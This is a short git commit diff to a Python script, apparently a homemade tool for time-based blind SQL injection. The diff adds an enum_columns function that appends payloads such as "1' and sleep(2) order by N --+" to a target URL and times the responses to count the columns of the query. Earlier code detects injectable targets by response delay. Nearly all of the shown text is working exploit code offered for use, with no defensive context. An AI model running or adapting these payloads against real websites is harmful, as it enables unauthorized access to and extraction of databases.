3926051dcc85a1d3c1a21057cadf1ce04367edd4
cristhoperHL <cristhopermma@gmail.com>
2020-11-29 15:10:08 -0500

    update

--- script.py
+++ script.py
@@ -20,9 +20,18 @@ def find_sqli_blind(url,s):
     return True if(tiempo > 5 and int(r.status_code)==200) else False
 
 def enum_columns(url,s):
-    columna=""
-
-    return columna
+    columna_max=0
+    for i in range(2,10):
+        sql_payload="1' and sleep(2) order by %s --+"%i
+        payloadf=url+sql_payload
+        start_time = time.time()        
+        r=s.get(payloadf)
+        tiempo=round(time.time() - start_time,2)
+        if(tiempo < 2):
+            break
+        else:
+            columna_max=i
+    return columna_max
 
 url=""
 opcion1=""
@@ -38,5 +47,11 @@ s=requests.session()
 s.get(url)
 r=s.get(url)
 
+final_column=enum_columns(url,s)
+print(final_column)
+
+"""
 if(find_sqli_blind(url,s)):
     print("Exist SQLi in the target ")
+"""
+
